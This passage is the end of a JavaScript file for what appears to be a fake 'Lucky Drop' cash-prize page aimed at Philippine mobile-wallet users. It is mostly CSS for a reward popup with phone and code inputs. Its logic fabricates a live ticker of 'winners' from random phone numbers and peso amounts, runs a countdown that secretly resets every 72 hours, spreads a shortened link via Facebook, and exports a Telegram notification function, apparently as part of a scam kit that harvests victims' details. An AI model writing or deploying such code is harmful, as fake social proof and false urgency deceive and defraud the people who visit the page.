            button.innerHTML = original;
        }, 1800);
    }

    // ============================================================
    // CARNIVAL ANIMATIONS (injected)
    // ============================================================
    function injectCarnivalAnimations() {
        if (document.querySelector('#carnival-animations')) return;

        var style = document.createElement('style');
        style.id = 'carnival-animations';
        style.textContent = [
            '@keyframes carnivalShake {',
                '0%, 100% { transform: translateX(0); }',
                '20% { transform: translateX(-8px); }',
                '40% { transform: translateX(8px); }',
                '60% { transform: translateX(-5px); }',
                '80% { transform: translateX(5px); }',
            '}',
            '@keyframes carnivalPopIn {',
                '0% { transform: scale(0.5) rotate(-5deg); opacity: 0; }',
                '60% { transform: scale(1.05) rotate(2deg); }',
                '100% { transform: scale(1) rotate(0deg); opacity: 1; }',
            '}',
            '@keyframes burstPulse {',
                '0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }',
                '50% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }',
            '}',
            '@keyframes confettiFall {',
                '0% { transform: translateY(-20px) rotate(0deg); opacity: 0; }',
                '10% { opacity: 1; }',
                '90% { opacity: 1; }',
                '100% { transform: translateY(500px) rotate(720deg); opacity: 0; }',
            '}',
            '@keyframes mascotFloat {',
                '0%, 100% { transform: translateY(0) scale(1); }',
                '50% { transform: translateY(-10px) scale(1.03); }',
            '}',
            '@keyframes mascotGlowPulse {',
                '0%, 100% { opacity: 0.7; transform: translate(-50%, -50%) scale(1); }',
                '50% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }',
            '}',
            '@keyframes amountPulse {',
                '0%, 100% { transform: scale(1); }',
                '50% { transform: scale(1.05); }',
            '}',
            '@keyframes btnShine {',
                '0% { left: -100%; }',
                '60% { left: 100%; }',
                '100% { left: 100%; }',
            '}',
            '@keyframes trophyBounce {',
                '0%, 100% { transform: scale(1) rotate(-5deg); }',
                '50% { transform: scale(1.1) rotate(5deg); }',
            '}',
            '@keyframes callPulse {',
                '0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(79, 195, 247, 0.4); }',
                '50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(79, 195, 247, 0.8); }',
            '}',

            '.carnival-phase {',
                'position: relative;',
                'width: 100%;',
                'max-width: 380px;',
                'padding: 28px 20px 24px;',
                'background: radial-gradient(circle at 50% 30%, rgba(255, 255, 255, 0.25) 0%, transparent 50%),',
                    'linear-gradient(145deg, #d10000 0%, #ff1744 40%, #8b0000 100%);',
                'border: 3px solid #ffd700;',
                'border-radius: 24px;',
                'box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8),',
                    '0 0 60px rgba(255, 215, 0, 0.5),',
                    'inset 0 0 40px rgba(255, 215, 0, 0.08);',
                'overflow: hidden;',
                'animation: carnivalPopIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);',
                'text-align: center;',
                'margin: 0 auto;',
                'box-sizing: border-box;',
            '}',

            '.carnival-close {',
                'position: absolute;',
                'top: 14px;',
                'right: 16px;',
                'width: 34px;',
                'height: 34px;',
                'background: rgba(255, 255, 255, 0.15);',
                'border: 1px solid rgba(255, 215, 0, 0.5);',
                'border-radius: 50%;',
                'color: #ffd700;',
                'font-size: 16px;',
                'font-weight: 900;',
                'cursor: pointer;',
                'display: flex;',
                'align-items: center;',
                'justify-content: center;',
                'z-index: 10;',
                'transition: all 0.2s ease;',
            '}',
            '.carnival-close:hover, .carnival-close:active {',
                'background: rgba(255, 68, 68, 0.4);',
                'color: #fff;',
                'transform: rotate(90deg);',
                'border-color: #ff4444;',
            '}',

            '.carnival-burst-bg {',
                'position: absolute;',
                'top: 30%;',
                'left: 50%;',
                'transform: translate(-50%, -50%);',
                'width: 400px;',
                'height: 400px;',
                'background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%,',
                    'rgba(255, 215, 0, 0.2) 30%, transparent 70%);',
                'border-radius: 50%;',
                'filter: blur(40px);',
                'pointer-events: none;',
                'animation: burstPulse 3s ease-in-out infinite;',
                'z-index: 1;',
            '}',

            '.carnival-confetti {',
                'position: absolute;',
                'inset: 0;',
                'pointer-events: none;',
                'overflow: hidden;',
                'z-index: 2;',
            '}',
            '.carnival-confetti span {',
                'position: absolute;',
                'width: 8px;',
                'height: 8px;',
                'border-radius: 2px;',
                'opacity: 0;',
                'animation: confettiFall 6s linear infinite;',
            '}',
            '.carnival-confetti span:nth-child(1) { left: 5%; background: #ffd700; animation-delay: 0s; }',
            '.carnival-confetti span:nth-child(2) { left: 15%; background: #ff6b9d; animation-delay: 1s; border-radius: 50%; }',
            '.carnival-confetti span:nth-child(3) { left: 25%; background: #4fc3f7; animation-delay: 2s; }',
            '.carnival-confetti span:nth-child(4) { left: 35%; background: #ff9800; animation-delay: 0.5s; border-radius: 50%; }',
            '.carnival-confetti span:nth-child(5) { left: 45%; background: #ffd700; animation-delay: 3s; }',
            '.carnival-confetti span:nth-child(6) { left: 55%; background: #ff6b9d; animation-delay: 1.5s; }',
            '.carnival-confetti span:nth-child(7) { left: 65%; background: #4fc3f7; animation-delay: 2.5s; border-radius: 50%; }',
            '.carnival-confetti span:nth-child(8) { left: 75%; background: #ffd700; animation-delay: 0.8s; }',
            '.carnival-confetti span:nth-child(9) { left: 85%; background: #ff9800; animation-delay: 3.5s; }',
            '.carnival-confetti span:nth-child(10) { left: 95%; background: #ff6b9d; animation-delay: 2s; border-radius: 50%; }',

            '.carnival-mascot {',
                'position: relative;',
                'width: min(180px, 45vw);',
                'height: min(180px, 45vw);',
                'margin: 0 auto 16px;',
                'z-index: 3;',
            '}',
            '.carnival-mascot img {',
                'width: 100%;',
                'height: 100%;',
                'object-fit: contain;',
                'position: relative;',
                'z-index: 2;',
                'filter: drop-shadow(0 15px 35px rgba(255, 215, 0, 0.7))',
                    'drop-shadow(0 0 30px rgba(255, 255, 255, 0.4));',
                'animation: mascotFloat 3s ease-in-out infinite;',
            '}',
            '.mascot-glow {',
                'position: absolute;',
                'top: 50%;',
                'left: 50%;',
                'transform: translate(-50%, -50%);',
                'width: 200%;',
                'height: 200%;',
                'background: radial-gradient(circle, rgba(255, 215, 0, 0.6) 0%,',
                    'rgba(255, 255, 255, 0.3) 30%, transparent 70%);',
                'border-radius: 50%;',
                'filter: blur(40px);',
                'animation: mascotGlowPulse 2s ease-in-out infinite;',
                'z-index: 1;',
            '}',

            '.carnival-title {',
                'font-family: "Playfair Display", serif;',
                'font-size: clamp(22px, 6vw, 30px);',
                'font-weight: 900;',
                'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 40%, #ffeb3b 60%, #ff9800 100%);',
                '-webkit-background-clip: text;',
                'background-clip: text;',
                'color: transparent;',
                'text-transform: uppercase;',
                'letter-spacing: 2px;',
                'margin: 0 0 12px;',
                'filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.8));',
                'position: relative;',
                'z-index: 3;',
            '}',

            '.carnival-amount {',
                'display: flex;',
                'align-items: baseline;',
                'justify-content: center;',
                'gap: 4px;',
                'margin: 0 0 16px;',
                'position: relative;',
                'z-index: 3;',
            '}',
            '.carnival-amount .currency {',
                'font-family: "Orbitron", monospace;',
                'font-size: clamp(20px, 5.5vw, 26px);',
                'font-weight: 900;',
                'color: #ffd700;',
                'text-shadow: 0 0 20px rgba(255, 215, 0, 0.9);',
            '}',
            '.carnival-amount .value {',
                'font-family: "Orbitron", monospace;',
                'font-size: clamp(38px, 10.5vw, 52px);',
                'font-weight: 900;',
                'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 40%, #ffeb3b 60%, #ff9800 100%);',
                '-webkit-background-clip: text;',
                'background-clip: text;',
                'color: transparent;',
                'letter-spacing: 2px;',
                'filter: drop-shadow(0 0 25px rgba(255, 215, 0, 0.9));',
                'animation: amountPulse 1.5s ease-in-out infinite;',
            '}',

            '.carnival-divider {',
                'width: 80px;',
                'height: 2px;',
                'background: linear-gradient(90deg, transparent, #ffd700, transparent);',
                'margin: 0 auto 16px;',
                'box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);',
                'position: relative;',
                'z-index: 3;',
            '}',

            '.carnival-bills {',
                'display: flex;',
                'justify-content: center;',
                'gap: 8px;',
                'margin: 0 0 16px;',
                'position: relative;',
                'z-index: 3;',
            '}',
            '.carnival-bills .bill-indicator {',
                'width: 55px;',
                'height: 28px;',
                'border-radius: 4px;',
                'overflow: hidden;',
                'border: 1px solid rgba(255, 215, 0, 0.3);',
                'transition: all 0.3s ease;',
            '}',
            '.carnival-bills .bill-indicator img {',
                'width: 100%;',
                'height: 100%;',
                'object-fit: cover;',
                'transition: all 0.3s ease;',
            '}',
            '.carnival-bills .bill-indicator.active {',
                'border-color: #ffd700;',
                'box-shadow: 0 0 12px rgba(255, 215, 0, 0.6);',
            '}',

            '.carnival-subtext {',
                'font-family: "Poppins", sans-serif;',
                'font-size: 12px;',
                'color: rgba(255, 255, 255, 0.85);',
                'margin: 0 0 18px;',
                'line-height: 1.5;',
                'position: relative;',
                'z-index: 3;',
            '}',

            '.carnival-btn {',
                'width: 100%;',
                'padding: 14px 18px;',
                'border-radius: 14px;',
                'font-family: "Orbitron", monospace;',
                'font-size: clamp(12px, 3.5vw, 14px);',
                'font-weight: 900;',
                'letter-spacing: 1.5px;',
                'cursor: pointer;',
                'display: flex;',
                'align-items: center;',
                'justify-content: center;',
                'gap: 10px;',
                'transition: all 0.1s ease;',
                'text-transform: uppercase;',
                'position: relative;',
                'overflow: hidden;',
                'z-index: 3;',
                'margin-bottom: 10px;',
            '}',
            '.carnival-btn-gold {',
                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.35) 0%, transparent 40%),',
                    'linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%);',
                'border: 3px solid #fff9c4;',
                'color: #8b0000;',
                'text-shadow: 0 2px 0 rgba(255, 255, 255, 0.7);',
                'box-shadow: 0 5px 0 #8b4500, 0 10px 25px rgba(0, 0, 0, 0.6),',
                    '0 0 35px rgba(255, 215, 0, 0.8);',
            '}',
            '.carnival-btn-gold::before {',
                'content: "";',
                'position: absolute;',
                'top: 0;',
                'left: -100%;',
                'width: 100%;',
                'height: 100%;',
                'background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent);',
                'animation: btnShine 2.5s infinite;',
            '}',
            '.carnival-btn-gold:active {',
                'transform: translateY(5px);',
                'box-shadow: 0 0 0 #8b4500, 0 5px 15px rgba(0, 0, 0, 0.6),',
                    '0 0 25px rgba(255, 215, 0, 0.6);',
            '}',
            '.carnival-btn-ghost {',
                'background: linear-gradient(to bottom, #555, #333);',
                'border: 1px solid #777;',
                'color: #ccc;',
                'padding: 10px 18px;',
                'font-size: 11px;',
                'box-shadow: 0 3px 0 #222;',
            '}',
            '.carnival-btn-ghost:active {',
                'transform: translateY(3px);',
                'box-shadow: 0 0 0 #222;',
            '}',
            '.carnival-btn-blue {',
                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.3) 0%, transparent 40%),',
                    'linear-gradient(180deg, #4fc3f7 0%, #0288d1 100%);',
                'border: 2px solid #81d4fa;',
                'color: #fff;',
                'text-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);',
                'box-shadow: 0 5px 0 #01579b, 0 10px 25px rgba(0, 0, 0, 0.5),',
                    '0 0 30px rgba(79, 195, 247, 0.6);',
            '}',
            '.carnival-btn-blue:active {',
                'transform: translateY(5px);',
                'box-shadow: 0 0 0 #01579b, 0 5px 15px rgba(0, 0, 0, 0.5);',
            '}',
            '.carnival-btn .gc-icon {',
                'width: 22px;',
                'height: 22px;',
                'object-fit: contain;',
            '}',

            '.carnival-trophy {',
                'font-size: 60px;',
                'margin-bottom: 10px;',
                'animation: trophyBounce 1s ease-in-out infinite;',
                'filter: drop-shadow(0 0 25px rgba(255, 215, 0, 0.8));',
                'position: relative;',
                'z-index: 3;',
            '}',

            '.carnival-reward-box {',
                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 50%),',
                    'linear-gradient(145deg, #1a0000, #330000);',
                'border: 2px solid #ffd700;',
                'border-radius: 16px;',
                'padding: 16px;',
                'margin: 0 0 18px;',
                'box-shadow: 0 0 25px rgba(255, 215, 0, 0.5),',
                    'inset 0 0 20px rgba(255, 215, 0, 0.1);',
                'position: relative;',
                'z-index: 3;',
            '}',
            '.carnival-reward-amount {',
                'font-family: "Orbitron", monospace;',
                'font-size: 14px;',
                'color: #fce883;',
                'margin-top: 8px;',
            '}',
            '.carnival-reward-amount strong {',
                'font-size: 24px;',
                'color: #ffd700;',
                'text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);',
                'display: inline-block;',
                'margin-left: 4px;',
            '}',

            '.carnival-call-icon {',
                'width: 80px;',
                'height: 80px;',
                'margin: 0 auto 16px;',
                'background: radial-gradient(circle, rgba(79, 195, 247, 0.2), rgba(0, 100, 200, 0.05));',
                'border: 2px solid rgba(79, 195, 247, 0.5);',
                'border-radius: 50%;',
                'display: flex;',
                'align-items: center;',
                'justify-content: center;',
                'animation: callPulse 2s ease-in-out infinite;',
                'position: relative;',
                'z-index: 3;',
            '}',
            '.carnival-call-icon i {',
                'font-size: 32px;',
                'color: #4fc3f7;',
                'text-shadow: 0 0 25px rgba(79, 195, 247, 0.8);',
            '}',

            '.carnival-phone-display {',
                'display: flex;',
                'align-items: center;',
                'justify-content: center;',
                'gap: 10px;',
                'margin: 0 0 16px;',
                'padding: 12px 20px;',
                'background: rgba(0, 0, 0, 0.4);',
                'border: 2px solid #4fc3f7;',
                'border-radius: 12px;',
                'box-shadow: 0 0 25px rgba(79, 195, 247, 0.4),',
                    'inset 0 0 20px rgba(79, 195, 247, 0.1);',
                'position: relative;',
                'z-index: 3;',
            '}',
            '.carnival-phone-display .phone-icon {',
                'font-size: 22px;',
            '}',
            '.carnival-phone-display .phone-number {',
                'font-family: "Orbitron", monospace;',
                'font-size: 20px;',
                'font-weight: 900;',
                'color: #4fc3f7;',
                'letter-spacing: 3px;',
                'text-shadow: 0 0 20px rgba(79, 195, 247, 0.6);',
            '}',

            '.carnival-status {',
                'background: rgba(79, 195, 247, 0.08);',
                'border: 1px solid rgba(79, 195, 247, 0.3);',
                'border-radius: 12px;',
                'padding: 14px;',
                'margin: 0 0 16px;',
                'text-align: center;',
                'position: relative;',
                'z-index: 3;',
            '}',
            '.carnival-status .status-icon {',
                'font-size: 26px;',
                'margin-bottom: 6px;',
            '}',
            '.carnival-status .status-text {',
                'font-family: "Poppins", sans-serif;',
                'font-size: 13px;',
                'color: rgba(255, 255, 255, 0.85);',
            '}',

            '.carnival-input {',
                'width: 100%;',
                'padding: 14px;',
                'background: rgba(0, 0, 0, 0.5);',
                'border: 2px solid #4fc3f7;',
                'border-radius: 10px;',
                'color: #4fc3f7;',
                'font-family: "Orbitron", monospace;',
                'font-size: 24px;',
                'font-weight: 900;',
                'text-align: center;',
                'letter-spacing: 4px;',
                'margin: 0 0 12px;',
                'box-sizing: border-box;',
                'transition: all 0.3s ease;',
                'position: relative;',
                'z-index: 3;',
            '}',
            '.carnival-input:focus {',
                'outline: none;',
                'border-color: #4fc3f7;',
                'box-shadow: 0 0 30px rgba(79, 195, 247, 0.3);',
            '}',
            '.carnival-input::placeholder {',
                'color: rgba(79, 195, 247, 0.3);',
                'letter-spacing: 2px;',
                'font-size: 16px;',
            '}',

            '.carnival-error {',
                'background: rgba(255, 68, 68, 0.1);',
                'border: 1px solid rgba(255, 68, 68, 0.2);',
                'border-radius: 8px;',
                'padding: 8px;',
                'color: #ff4444;',
                'font-size: 11px;',
                'text-align: center;',
                'margin: 0 0 12px;',
                'font-family: "Poppins", sans-serif;',
                'position: relative;',
                'z-index: 3;',
            '}'
        ].join('');
        document.head.appendChild(style);
    }

    // ============================================================
    // TIMER
    // ============================================================
    function initTimer() {
        var displayElement = document.getElementById('mainTimerDisplay');
        if (!displayElement) return;

        var CYCLE_HOURS = 72;
        var timerEndDate = null;

        try {
            var savedEnd = localStorage.getItem('timerEndDate');
            var now = Date.now();

            if (savedEnd && parseInt(savedEnd) > now) {
                timerEndDate = parseInt(savedEnd);
            } else {
                timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                localStorage.setItem('timerEndDate', timerEndDate);
            }

            function update() {
                var now = Date.now();
                var diff = timerEndDate - now;

                if (diff <= 0) {
                    timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                    localStorage.setItem('timerEndDate', timerEndDate);
                    diff = CYCLE_HOURS * 60 * 60 * 1000;
                }

                var days = Math.floor(diff / (1000 * 60 * 60 * 24));
                var hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
                var minutes = Math.floor((diff / (1000 * 60)) % 60);
                var seconds = Math.floor((diff / 1000) % 60);

                displayElement.innerHTML = days + 'D ' +
                    hours.toString().padStart(2, '0') + ':' +
                    minutes.toString().padStart(2, '0') + ':' +
                    seconds.toString().padStart(2, '0');
            }

            update();
            setInterval(update, 1000);
        } catch(e) {
            console.error('Timer error:', e);
        }
    }

    // ============================================================
    // TICKER
    // ============================================================
    function initTicker() {
        var winnerSpan = document.getElementById('winnerText');
        if (!winnerSpan) return;

        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
        var amountRarity = [
            { amount: 500, weight: 85 },
            { amount: 1000, weight: 10 },
            { amount: 2000, weight: 3 },
            { amount: 2500, weight: 2 }
        ];
        var actions = ["received", "received", "withdraw"];

        function generateRandomAmount() {
            var totalWeight = 0;
            for (var i = 0; i < amountRarity.length; i++) totalWeight += amountRarity[i].weight;
            var random = Math.random() * totalWeight;
            var cumulative = 0;
            for (var i = 0; i < amountRarity.length; i++) {
                cumulative += amountRarity[i].weight;
                if (random <= cumulative) return amountRarity[i].amount;
            }
            return 500;
        }

        function updateTicker() {
            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var last4 = Math.floor(1000 + Math.random() * 9000);
            var amount = generateRandomAmount();
            var action = actions[Math.floor(Math.random() * actions.length)];

            winnerSpan.innerHTML = prefix + '***' + last4 + ' ' + action +
                ' <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' +
                amount.toLocaleString();
        }

        updateTicker();
        setInterval(updateTicker, 4800);
    }

    // ============================================================
    // CONFETTI
    // ============================================================
    var confettiCanvas = null;
    var confettiAnimation = null;

    function initConfetti() {
        confettiCanvas = document.getElementById('confettiCanvas');
    }

    function startConfetti() {
        if (!confettiCanvas) return;

        confettiCanvas.style.display = 'block';
        confettiCanvas.width = window.innerWidth;
        confettiCanvas.height = window.innerHeight;

        var ctx = confettiCanvas.getContext('2d');
        var particles = [];

        for (var i = 0; i < 150; i++) {
            particles.push({
                x: Math.random() * confettiCanvas.width,
                y: Math.random() * confettiCanvas.height - confettiCanvas.height,
                size: Math.random() * 8 + 3,
                color: 'hsl(' + (Math.random() * 360) + ', 100%, 60%)',
                speed: Math.random() * 4 + 2,
                rotation: Math.random() * 360,
                rotationSpeed: (Math.random() - 0.5) * 10
            });
        }

        function draw() {
            if (!confettiCanvas || confettiCanvas.style.display === 'none') return;
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);

            for (var i = 0; i < particles.length; i++) {
                var p = particles[i];
                ctx.save();
                ctx.translate(p.x, p.y);
                ctx.rotate(p.rotation * Math.PI / 180);
                ctx.fillStyle = p.color;
                ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
                ctx.restore();

                p.y += p.speed;
                p.rotation += p.rotationSpeed;

                if (p.y > confettiCanvas.height) {
                    p.y = -p.size;
                    p.x = Math.random() * confettiCanvas.width;
                }
            }
            confettiAnimation = requestAnimationFrame(draw);
        }

        draw();

        setTimeout(function() {
            if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            confettiCanvas.style.display = 'none';
        }, 4000);
    }

    // ============================================================
    // BUTTON EVENTS
    // ============================================================
    function attachButtonEvents() {
        var logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) {
            logoutBtn.addEventListener('click', function() {
                logoutUser();
            });
        }

        var fbBtn = document.getElementById('facebookShareBtn');
        if (fbBtn) {
            fbBtn.addEventListener('click', function() {
                shareOnFacebook();
            });
        }
    }

    function logoutUser() {
        if (userPhone) {
            try {
                db.ref('user_sessions/' + userPhone).update({
                    status: 'offline',
                    lastSeen: firebase.database.ServerValue.TIMESTAMP
                });
            } catch(e) {}
        }
        localStorage.clear();
        sessionStorage.clear();
        window.location.replace('index.html');
    }

    function shareOnFacebook() {
        var shareUrl = 'https://tiny.cc/LuckyDrop';
        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=400');
    }

    // ============================================================
    // EXPORT
    // ============================================================
    window.PlayBonus = {
        playSound: playSound,
        formatNumberWithComma: formatNumberWithComma,
        getBalance: function() { return currentBalance; },
        getUserPhone: function() { return userPhone; },
        isUserClaimed: function() { return isClaimed; },
        showPopup: window.showPopup,
        closePopup: window.closePopup,
        getFirewallStatus: function() { return currentFirewallStatus; },
        sendTelegram: sendTelegramNotification
    };

    // ============================================================
    // START
    // ============================================================
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
